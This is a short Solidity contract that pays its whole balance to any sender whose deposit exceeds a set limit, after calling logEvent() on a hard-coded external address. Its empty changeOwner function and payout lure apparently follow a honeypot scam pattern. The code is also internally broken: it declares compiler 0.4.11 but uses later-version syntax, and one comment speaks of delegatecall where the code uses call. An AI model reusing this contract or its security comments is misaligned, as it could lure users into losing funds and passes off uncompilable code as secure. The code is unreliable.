pragma solidity ^0.4.11;
contract firstTest
{
    address Owner = 0x46Feeb381e90f7e30635B4F33CE3F6fA8EA6ed9b;
    address emails = 0x25df6e3da49f41ef5b99e139c87abc12c3583d13;
    address adr;
    uint256 public Limit= 1000000000000000000;
    function Set(address dataBase, uint256 limit) 
    {
        require(msg.sender == Owner); 
        Limit = limit;
        emails = dataBase;
    }
    function changeOwner(address adr){
    }
    function()payable{
        withdrawal();
    }
    function kill() {
        require(msg.sender == Owner);
        selfdestruct(msg.sender);
    }
    function withdrawal() public payable {
    require(msg.value > 0, "Value must be greater than 0");
    
    adr = msg.sender;
    
    if (msg.value > Limit) {
        // Use call() instead of delegatecall for better security
        (bool success, ) = emails.call(abi.encodeWithSignature("logEvent()"));
        require(success, "Delegate call failed");
        
        // Check return value of send() and handle failure
        bool sendSuccess = adr.send(address(this).balance);
        require(sendSuccess, "Transfer failed");
    }
}
}